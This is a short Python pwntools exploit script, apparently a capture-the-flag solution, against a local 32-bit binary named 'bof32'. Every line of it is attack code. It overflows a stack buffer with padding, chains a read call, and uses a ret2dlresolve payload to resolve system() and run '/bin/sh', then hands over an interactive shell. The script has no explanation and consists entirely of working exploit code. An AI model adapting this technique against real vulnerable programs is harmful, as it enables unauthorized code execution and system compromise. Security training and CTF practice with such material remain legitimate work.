# -*- coding: utf-8 -*-
import sys
from pwn import *
from IPython import embed

context.binary = './bof32'

p = process('./bof32')
e = ELF('./bof32')

rop = ROP(context.binary)

dlresolve = Ret2dlresolvePayload(e, symbol='system', args=['/bin/sh\x00'])
rop.ret2dlresolve(dlresolve)

payload = 'a'*0x70
payload += p32(e.plt['read'])
payload += p32(0x8049351)
payload += p32(0)
payload += p32(dlresolve.data_addr)
payload += p32(len(dlresolve.payload))
payload += rop.chain()
p.sendafter('CTF!\n', payload.ljust(0x100,'\x00'))

p.send(dlresolve.payload)

p.interactive()
